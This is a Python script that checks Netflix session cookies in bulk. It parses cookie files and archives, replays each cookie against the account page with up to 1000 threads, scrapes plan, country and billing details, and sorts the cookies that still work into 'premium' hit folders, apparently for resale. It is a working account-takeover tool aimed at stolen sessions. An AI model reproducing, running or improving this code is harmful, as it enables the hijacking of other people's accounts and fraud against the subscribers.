import requests
import os
import threading
import colorama
import shutil
import re
import json
import time
import traceback
import zipfile
import argparse
import sys
import queue
import concurrent.futures
import multiprocessing
from multiprocessing import Manager, Pool, Process, Value, Lock
from datetime import datetime

# Global counters
total_working = 0
total_fails = 0
total_unsubscribed = 0
total_checked = 0
total_broken = 0
lock = threading.Lock()
last_update_time = time.time()  # Track time for progress updates
update_interval = 0.2  # Update progress every 200ms for real-time visualization
start_time = time.time()  # Track overall start time for speed calculations

# Performance optimization constants
MAX_THREADS = 1000  # Optimized for performance and stability
CPU_COUNT = min(multiprocessing.cpu_count(), 8)  # Cap CPU usage to avoid system overload
BATCH_SIZE = 500  # Process cookies in batches for better performance
CONNECTION_TIMEOUT = 10  # Connection timeout in seconds
READ_TIMEOUT = 15  # Read timeout in seconds

# Global paths
working_cookies_dir = "working_cookies"
temp_dir = "temp"
MAX_RECURSION_DEPTH = 5  # Prevent infinite recursion
NETFLIX_DIR = "netflix"  # Direct netflix folder for commands like .cstock and .csend
dirs = {
    "netflix": {
        "root": NETFLIX_DIR, 
        "hits": "working_cookies/netflix/premium",
        "failures": "working_cookies/netflix/failures", 
        "broken": "working_cookies/netflix/broken",
        "free": "working_cookies/netflix/free"
    }
}

def debug_print(message):
    """Print debug messages with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"[{timestamp}] {message}")

def setup_directories():
    """Setup all required directories"""
    for category in dirs["netflix"].values():
        os.makedirs(category, exist_ok=True)
    
    os.makedirs(temp_dir, exist_ok=True)

def print_banner():
    """Print the Netflix cookie checker banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = """
    ███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗
    ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝
    ██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝ 
    ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗ 
    ██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝
    
           Cookie Checker - Netflix Premium Edition
                     Optimized Version 3.0
    """
    print(banner)

def convert_to_netscape_format(cookie):
    """Convert the cookie dictionary to the Netscape cookie format string"""
    if not cookie:
        return None
    
    try:
        if isinstance(cookie, dict):
            # Handle dictionary format
            domain = cookie.get('domain', '.netflix.com')
            if not domain.startswith('.'):
                domain = '.' + domain
            
            # Default values for required fields
            path = cookie.get('path', '/')
            secure = cookie.get('secure', True)
            expiry = int(cookie.get('expires', int(time.time()) + 3600 * 24 * 365))
            name = cookie.get('name', '')
            value = cookie.get('value', '')
            
            # Format the cookie line
            return f"{domain}\tTRUE\t{path}\t{'TRUE' if secure else 'FALSE'}\t{expiry}\t{name}\t{value}"
        else:
            # Already in proper format
            return cookie
    except Exception as e:
        debug_print(f"Error converting cookie to Netscape format: {str(e)}")
        return None

def process_json_files(directory):
    """Process JSON files and convert them to Netscape format"""
    debug_print(f"Processing JSON files in {directory}")
    netscape_cookies = []
    
    try:
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith('.json'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            try:
                                # Try to parse as JSON
                                cookie_data = json.loads(content)
                                
                                # Handle various JSON cookie formats
                                if isinstance(cookie_data, list):
                                    # Array of cookies
                                    for cookie in cookie_data:
                                        netscape_format = convert_to_netscape_format(cookie)
                                        if netscape_format:
                                            netscape_cookies.append(netscape_format)
                                elif isinstance(cookie_data, dict):
                                    # Single cookie object or container object
                                    if 'cookies' in cookie_data and isinstance(cookie_data['cookies'], list):
                                        # Handle container objects with cookies array
                                        for cookie in cookie_data['cookies']:
                                            netscape_format = convert_to_netscape_format(cookie)
                                            if netscape_format:
                                                netscape_cookies.append(netscape_format)
                                    else:
                                        # Single cookie object
                                        netscape_format = convert_to_netscape_format(cookie_data)
                                        if netscape_format:
                                            netscape_cookies.append(netscape_format)
                            except json.JSONDecodeError:
                                # If not valid JSON, try to identify cookie lines in the content
                                lines = content.split('\n')
                                for line in lines:
                                    if '.netflix.com' in line and not line.strip().startswith('//'):
                                        netscape_cookies.append(line.strip())
                    except Exception as e:
                        debug_print(f"Error processing JSON file {file_path}: {str(e)}")
    except Exception as e:
        debug_print(f"Error traversing directory {directory}: {str(e)}")
    
    return netscape_cookies

def load_cookies_from_file(cookie_file):
    """Load cookies from a given file and return a dictionary of cookies."""
    debug_print(f"Loading cookies from {cookie_file}")
    cookies = {}
    
    try:
        with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Handle JSON files
            if cookie_file.endswith('.json'):
                try:
                    # Try parsing as JSON first
                    cookie_data = json.loads(content)
                    
                    # Handle common JSON formats
                    if isinstance(cookie_data, list):
                        for cookie in cookie_data:
                            if 'name' in cookie and 'value' in cookie and 'domain' in cookie:
                                cookies[cookie['name']] = cookie['value']
                    elif isinstance(cookie_data, dict):
                        if 'cookies' in cookie_data:
                            # Handle format like {cookies: [{name, value, domain}, ...]}
                            for cookie in cookie_data['cookies']:
                                if 'name' in cookie and 'value' in cookie:
                                    cookies[cookie['name']] = cookie['value']
                        else:
                            # Try to find cookie data directly
                            for key, value in cookie_data.items():
                                if isinstance(value, str):
                                    cookies[key] = value
                except json.JSONDecodeError:
                    # If not valid JSON, try parsing as text
                    pass
            
            # For all files (including failed JSON parsing), try text-based parsing
            if not cookies:
                lines = content.split('\n')
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Try Netscape cookie format first (domain\tTRUE\tpath\tsecure\texpiry\tname\tvalue)
                    if '\t' in line and '.netflix.com' in line:
                        parts = line.split('\t')
                        if len(parts) >= 7:
                            name, value = parts[5], parts[6]
                            cookies[name] = value
                    
                    # Try standard cookie format (name=value; ...)
                    elif '=' in line and ';' in line and '.netflix.com' in line:
                        for cookie_part in line.split(';'):
                            cookie_part = cookie_part.strip()
                            if '=' in cookie_part:
                                name, value = cookie_part.split('=', 1)
                                cookies[name.strip()] = value.strip()
        
        # Special handling for known critical Netflix cookies
        for required_cookie in ['NetflixId', 'SecureNetflixId']:
            # Check for alternate naming (case-insensitive)
            for cookie_name in list(cookies.keys()):
                if cookie_name.lower() == required_cookie.lower() and cookie_name != required_cookie:
                    cookies[required_cookie] = cookies[cookie_name]
        
        return cookies if cookies else None
    except Exception as e:
        debug_print(f"Error loading cookies from file {cookie_file}: {str(e)}")
        return None

def make_request_with_cookies(cookies):
    """Make an HTTP request to Netflix using provided cookies."""
    debug_print(f"Making request with cookies: {list(cookies.keys())}")
    
    # These are essential cookies for Netflix
    netflix_cookies = {
        'nfvdid': cookies.get('nfvdid', ''),
        'NetflixId': cookies.get('NetflixId', ''),
        'SecureNetflixId': cookies.get('SecureNetflixId', ''),
        'playerid': cookies.get('playerid', '')
    }
    
    url = "https://www.netflix.com/YourAccount"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'DNT': '1'
    }

    try:
        response = requests.get(url, cookies=netflix_cookies, headers=headers, 
                                timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT))
        if response.status_code == 200 and 'profile-selector' not in response.url:
            return response.text
    except Exception as e:
        debug_print(f"HTTP request error: {str(e)}")
    
    return None

def extract_info(response_text):
    """Extract relevant information from the Netflix account page using optimized patterns."""
    debug_print("Extracting account information from response")
    
    # Initialize with default values
    info = {
        'membershipStatus': None,
        'countryOfSignup': 'UNKNOWN',
        'memberSince': 'UNKNOWN',
        'billingAddress': '',
        'paymentMethod': '',
        'lastBillingDate': '',
        'totalMembers': 1,
        'localizedPlanName': 'Unknown',
        'showExtraMemberSection': False
    }
    
    try:
        # Check for membership status
        if 'cancelPlan' in response_text or 'Restart your membership' in response_text:
            info['membershipStatus'] = 'CURRENT_MEMBER' if 'cancelPlan' in response_text else 'CANCELED'
        
        # Extract country code (using optimized pattern)
        country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', response_text)
        if country_match:
            info['countryOfSignup'] = country_match.group(1)
        
        # Extract member since date (using optimized pattern)
        member_since_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', response_text)
        if member_since_match:
            info['memberSince'] = member_since_match.group(1)
        
        # Extract plan name (using optimized pattern)
        plan_match = re.search(r'"currentPlan"\s*:\s*{[^}]*"planName"\s*:\s*"([^"]+)"', response_text)
        if plan_match:
            info['localizedPlanName'] = plan_match.group(1)
        
        # Check for extra member section
        info['showExtraMemberSection'] = 'manageExtraMember' in response_text or 'extraMemberAllowed' in response_text
        
        # Parse billing info if available (using optimized pattern)
        billing_match = re.search(r'"billingActivity"\s*:\s*(\{[^}]+\})', response_text)
        if billing_match:
            try:
                billing_data = json.loads(billing_match.group(1))
                info['lastBillingDate'] = billing_data.get('lastBillingDate', '')
            except:
                pass

        return info
    except Exception as e:
        debug_print(f"Error extracting info: {str(e)}")
        # Return basic info even if extraction fails
        return info

def handle_successful_login(cookie_file, info, is_subscribed):
    """Handle the actions required after a successful Netflix login."""
    global total_working, total_unsubscribed
    
    if not is_subscribed:
        with lock:
            total_unsubscribed += 1
        debug_print(f"Login successful with {cookie_file}, but not subscribed. Moving to free folder.")
        free_folder = dirs["netflix"]["free"]
        shutil.move(cookie_file, os.path.join(free_folder, os.path.basename(cookie_file)))
        return
    
    with lock:
        total_working += 1
    debug_print(f"Login successful with {cookie_file} - Country: {info['countryOfSignup']}, Member since: {info['memberSince']}")
    
    # Create a meaningful filename - strip paths and make safe
    base_filename = os.path.basename(cookie_file)
    # Clean the filename to avoid invalid characters
    plan_name = info.get('localizedPlanName', 'Unknown').replace(' ', '_')
    country = info['countryOfSignup']
    is_extra = info.get('showExtraMemberSection', 'unknown')
    
    # Make sure filename is safe for filesystem
    safe_filename = f"{country}_{plan_name}_{is_extra}_{base_filename}"
    safe_filename = re.sub(r'[\\/*?:"<>|]', '_', safe_filename)
    
    # Prepare the destination folders
    hits_folder = dirs["netflix"]["hits"]
    os.makedirs(hits_folder, exist_ok=True)
    os.makedirs(NETFLIX_DIR, exist_ok=True)
    
    # Create paths for both locations
    organized_filepath = os.path.join(hits_folder, safe_filename)
    netflix_filepath = os.path.join(NETFLIX_DIR, f"Premium_{country}_{base_filename}")
    
    # Read the original cookie content
    with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as infile:
        cookie_content = infile.read()
    
    # Write to both locations for redundancy
    with open(organized_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(cookie_content)
    
    with open(netflix_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(cookie_content)
    
    debug_print(f"Cookie saved to {organized_filepath} and {netflix_filepath}")

def handle_failed_login(cookie_file):
    """Handle the actions required after a failed Netflix login."""
    global total_fails
    with lock:
        total_fails += 1
    
    debug_print(f"Login failed with {cookie_file}")
    failures_folder = dirs["netflix"]["failures"]
    os.makedirs(failures_folder, exist_ok=True)
    
    # Move the file to failures folder
    try:
        dest_path = os.path.join(failures_folder, os.path.basename(cookie_file))
        shutil.move(cookie_file, dest_path)
    except Exception as e:
        debug_print(f"Error moving failed cookie file: {str(e)}")

def process_cookie_file(cookie_file):
    """Process a single Netflix cookie file to check validity."""
    global total_checked, total_broken, total_fails, total_unsubscribed, total_working
    
    debug_print(f"Processing cookie file: {cookie_file}")
    
    try:
        # Load cookies and check if valid
        cookies = load_cookies_from_file(cookie_file)
        
        if not cookies:
            with lock:
                total_broken += 1
            debug_print(f"Failed to parse cookies from {cookie_file}")
            return False
        
        # Make request with cookies
        response_text = make_request_with_cookies(cookies)
        
        if not response_text:
            with lock:
                total_fails += 1
                total_checked += 1
            debug_print(f"Failed to get valid response from Netflix with {cookie_file}")
            handle_failed_login(cookie_file)
            return False
        
        # Extract info from response
        info = extract_info(response_text)
        is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
        
        with lock:
            total_checked += 1
            if is_subscribed:
                total_working += 1
            else:
                total_unsubscribed += 1
        
        # Handle the result
        handle_successful_login(cookie_file, info, is_subscribed)
        
        # Return True if subscribed, False otherwise
        return is_subscribed
    except Exception as e:
        debug_print(f"Error processing cookie file {cookie_file}: {str(e)}")
        with lock:
            total_broken += 1
        return False

def worker(task_queue, results):
    """Worker thread to process Netflix cookie files using a queue system."""
    while not task_queue.empty():
        try:
            cookie_file = task_queue.get_nowait()
            result = process_cookie_file(cookie_file)
            results.append((cookie_file, result))
        except queue.Empty:
            break
        except Exception as e:
            debug_print(f"Worker error: {str(e)}")
        finally:
            task_queue.task_done()

def extract_from_archive(archive_path, extract_dir):
    """Extract files from a ZIP or RAR archive."""
    debug_print(f"Extracting archive {archive_path} to {extract_dir}")
    print(f"Extracting archive {archive_path}...")
    
    try:
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            # Handle ZIP files
            with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            debug_print(f"Successfully extracted ZIP archive {archive_path}")
            return True
            
        elif file_ext == '.rar':
            # Handle RAR files
            has_rarfile = False
            try:
                import rarfile
                has_rarfile = True
            except ImportError:
                debug_print("RAR support not available, trying to use system unrar")
                
            if has_rarfile:
                try:
                    with rarfile.RarFile(archive_path, 'r') as rar_ref:
                        rar_ref.extractall(extract_dir)
                    debug_print(f"Successfully extracted RAR archive {archive_path}")
                    return True
                except Exception as e:
                    debug_print(f"Failed to extract with rarfile: {str(e)}, trying system unrar")
            
            # Try using system unrar as fallback
            try:
                os.system(f"unrar x -y \"{archive_path}\" \"{extract_dir}\"")
                debug_print(f"Extracted RAR with system unrar: {archive_path}")
                return True
            except Exception as e:
                debug_print(f"Failed to extract RAR using system commands: {str(e)}")
                return False
        
        debug_print(f"Unsupported archive format: {file_ext}")
        return False
        
    except Exception as e:
        debug_print(f"Error extracting archive {archive_path}: {str(e)}")
        return False

def process_directory(directory, processed_files=None, depth=0, max_depth=MAX_RECURSION_DEPTH):
    """Process a directory recursively for cookie files and archives."""
    if depth > max_depth:
        debug_print(f"Maximum recursion depth reached, stopping at {directory}")
        return []
    
    if processed_files is None:
        processed_files = set()
    
    debug_print(f"Processing directory: {directory} (depth: {depth})")
    
    found_cookie_files = []
    
    try:
        for root, dirs, files in os.walk(directory):
            # Process all files in current directory
            for file in files:
                if file.endswith(('.zip', '.rar')):
                    # Handle nested archives
                    archive_path = os.path.join(root, file)
                    absolute_path = os.path.abspath(archive_path)
                    
                    if absolute_path in processed_files:
                        debug_print(f"Skipping already processed archive: {archive_path}")
                        continue
                    
                    processed_files.add(absolute_path)
                    
                    # Extract the nested archive
                    extract_dir = os.path.join(temp_dir, f"extracted_{os.path.basename(archive_path)}")
                    os.makedirs(extract_dir, exist_ok=True)
                    
                    if extract_from_archive(archive_path, extract_dir):
                        # Process extracted files recursively
                        extracted_cookies = process_directory(extract_dir, processed_files, depth + 1, max_depth)
                        found_cookie_files.extend(extracted_cookies)
                
                elif file.endswith(('.txt', '.json', '.netscape', '.cookie', 'cookies')):
                    # Direct cookie file
                    cookie_path = os.path.join(root, file)
                    absolute_path = os.path.abspath(cookie_path)
                    
                    if absolute_path in processed_files:
                        debug_print(f"Skipping already processed cookie file: {cookie_path}")
                        continue
                    
                    processed_files.add(absolute_path)
                    found_cookie_files.append(cookie_path)
    
    except Exception as e:
        debug_print(f"Error processing directory {directory}: {str(e)}")
    
    debug_print(f"Found {len(found_cookie_files)} cookie files in {directory}")
    return found_cookie_files

def process_batch(batch_files, batch_id):
    """Process a batch of cookie files in a separate process."""
    debug_print(f"Starting batch {batch_id} with {len(batch_files)} files")
    
    batch_working = 0
    batch_fails = 0
    batch_unsubscribed = 0
    batch_checked = 0
    batch_broken = 0
    
    for cookie_file in batch_files:
        try:
            # Load cookies and check if valid
            cookies = load_cookies_from_file(cookie_file)
            
            if not cookies:
                batch_broken += 1
                continue
            
            # Make request with cookies
            response_text = make_request_with_cookies(cookies)
            
            if not response_text:
                batch_fails += 1
                batch_checked += 1
                continue
            
            # Extract info from response
            info = extract_info(response_text)
            is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
            
            if is_subscribed:
                batch_working += 1
                # Handle the working cookie
                handle_successful_login(cookie_file, info, is_subscribed)
            else:
                batch_unsubscribed += 1
            
            batch_checked += 1
            
        except Exception as e:
            debug_print(f"Error processing cookie file {cookie_file} in batch {batch_id}: {str(e)}")
            batch_broken += 1
    
    return {
        'working': batch_working,
        'fails': batch_fails,
        'unsubscribed': batch_unsubscribed,
        'checked': batch_checked,
        'broken': batch_broken
    }

def check_netflix_cookies(cookies_dir="netflix", num_threads=None):
    """Check all Netflix cookies in the specified directory using both multiprocessing and multithreading."""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken
    
    if num_threads is None:
        num_threads = MAX_THREADS
    
    debug_print(f"Starting Netflix cookie check in {cookies_dir} with {num_threads} threads")
    print(f"Starting Netflix cookie check in {cookies_dir} with {num_threads} threads")
    
    # Get list of cookie files
    cookie_files = process_directory(cookies_dir)
    
    if not cookie_files:
        debug_print(f"No cookie files found in {cookies_dir}")
        print(f"No cookie files found in {cookies_dir}")
        return
    
    debug_print(f"Found {len(cookie_files)} Netflix cookie files to check")
    print(f"Found {len(cookie_files)} Netflix cookie files to check")
    
    # Create a task queue
    task_queue = queue.Queue()
    
    # Add all cookie files to the queue
    for cookie_file in cookie_files:
        task_queue.put(cookie_file)
    
    # Create a list to store results
    results = []
    
    # Create and start worker threads
    threads = []
    for _ in range(min(num_threads, task_queue.qsize())):
        thread = threading.Thread(target=worker, args=(task_queue, results))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Print progress while processing
    total_files = len(cookie_files)
    start_time = time.time()
    
    while any(thread.is_alive() for thread in threads):
        remaining = task_queue.qsize()
        processed = total_files - remaining
        percent = (processed / total_files) * 100 if total_files > 0 else 0
        
        elapsed = time.time() - start_time
        speed = processed / elapsed if elapsed > 0 else 0
        
        # Print progress update
        print(f"PROGRESS REPORT | Progress: {processed}/{total_files} ({percent:.2f}%) | Valid: {total_working} | Failed: {total_fails} | Speed: {speed:.2f} cookies/s")
        
        # Check if all items are processed
        if remaining == 0:
            break
        
        # Sleep to avoid excessive CPU usage
        time.sleep(1)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Print final statistics
    print_statistics()

def print_statistics():
    """Print statistics of the Netflix cookie checking process."""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken, start_time
    
    elapsed = time.time() - start_time
    speed = total_checked / elapsed if elapsed > 0 else 0
    
    success_rate = (total_working / total_checked) * 100 if total_checked > 0 else 0
    
    print("\nNETFLIX COOKIE CHECK RESULTS")
    print("===========================")
    print(f"Total Working: {total_working}")
    print(f"Total Failed: {total_fails}")
    print(f"Total Unsubscribed: {total_unsubscribed}")
    print(f"Total Broken/Invalid: {total_broken}")
    print(f"Total Checked: {total_checked}")
    print(f"Success Rate: {success_rate:.2f}%")
    print(f"Time Elapsed: {elapsed:.2f} seconds")
    print(f"Processing Speed: {speed:.2f} cookies/second")
    print("===========================")

def check_cookie(cookie_content):
    """Check a single Netflix cookie string."""
    debug_print("Checking single cookie string")
    
    # Create a temporary file for the cookie
    temp_file = os.path.join(temp_dir, f"temp_cookie_{int(time.time())}.txt")
    os.makedirs(temp_dir, exist_ok=True)
    
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(cookie_content)
        
        # Process the cookie file
        return process_cookie_file(temp_file)
    finally:
        # Clean up temporary file
        if os.path.exists(temp_file):
            os.remove(temp_file)

def command_main():
    """Main function for command-line usage"""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken
    
    # Initialize colorama for cross-platform colored output
    colorama.init()
    print_banner()
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Check Netflix cookies')
    parser.add_argument('input_file', nargs='?', help='File or directory to check')
    parser.add_argument('--all_cookies', action='store_true', help='Check all cookies in netflix directory')
    parser.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Number of threads to use (1-{MAX_THREADS}, default: {MAX_THREADS})')
    args = parser.parse_args()
    
    # Validate and set thread count
    if args.threads < 1:
        args.threads = 1
    elif args.threads > MAX_THREADS:
        args.threads = MAX_THREADS
    
    debug_print(f"Using {args.threads} threads for processing")
    
    # Setup directories
    setup_directories()
    
    if args.all_cookies:
        # Check all cookies in the netflix directory
        debug_print("Checking all Netflix cookies...")
        print("Checking all Netflix cookies in the netflix directory...")
        
        if os.path.exists(NETFLIX_DIR):
            check_netflix_cookies(NETFLIX_DIR)
        else:
            error_msg = f"Error: Netflix directory not found at {NETFLIX_DIR}"
            print(error_msg)
            debug_print(error_msg)
            sys.exit(1)
    elif args.input_file:
        filepath = args.input_file
        if os.path.isfile(filepath):
            # If checking a single file
            debug_print(f"Checking single cookie file: {filepath}")
            
            # Check file extension to see if it's an archive
            file_ext = os.path.splitext(filepath)[1].lower()
            if file_ext in ['.zip', '.rar']:
                # For archives, extract and process all files
                extract_dir = os.path.join(os.path.dirname(filepath), f"temp_extracted_{os.path.basename(filepath)}")
                os.makedirs(extract_dir, exist_ok=True)
                
                if extract_from_archive(filepath, extract_dir):
                    # Process all extracted cookie files
                    cookie_files = process_directory(extract_dir)
                    
                    if cookie_files:
                        debug_print(f"Processing {len(cookie_files)} cookie files from archive")
                        print(f"Processing {len(cookie_files)} cookie files from archive")
                        
                        # Process each cookie file
                        results = []
                        valid_count = 0
                        invalid_count = 0
                        
                        for cookie_file in cookie_files:
                            try:
                                # Load cookies and check if valid
                                cookies = load_cookies_from_file(cookie_file)
                                
                                if not cookies:
                                    total_broken += 1
                                    continue
                                    
                                # Make request with cookies
                                response_text = make_request_with_cookies(cookies)
                                
                                if not response_text:
                                    total_fails += 1
                                    total_checked += 1
                                    continue
                                    
                                # Extract info from response
                                try:
                                    info = extract_info(response_text)
                                    is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
                                    
                                    if is_subscribed:
                                        total_working += 1
                                        # Handle the working cookie
                                        handle_successful_login(cookie_file, info, is_subscribed)
                                    else:
                                        total_unsubscribed += 1
                                        
                                    total_checked += 1
                                    
                                except Exception as e:
                                    debug_print(f"Error extracting info from cookie file {cookie_file}: {e}")
                                    total_fails += 1
                                    total_checked += 1
                                
                            except Exception as e:
                                debug_print(f"Error processing cookie file {cookie_file}: {e}")
                                total_broken += 1
                        
                        # Print statistics
                        print_statistics()
                    else:
                        debug_print("No cookie files found in the archive")
                        print_statistics()
                else:
                    # If extraction failed, try processing the archive as a regular file
                    result = process_cookie_file(filepath)
                    print_statistics()
            else:
                # For regular files, just process the single file
                result = process_cookie_file(filepath)
                print_statistics()
        else:
            # If it's a directory, check all files in it
            check_netflix_cookies(filepath)
    else:
        # Default behavior with no arguments - check netflix directory
        check_netflix_cookies()

if __name__ == "__main__":
    command_main()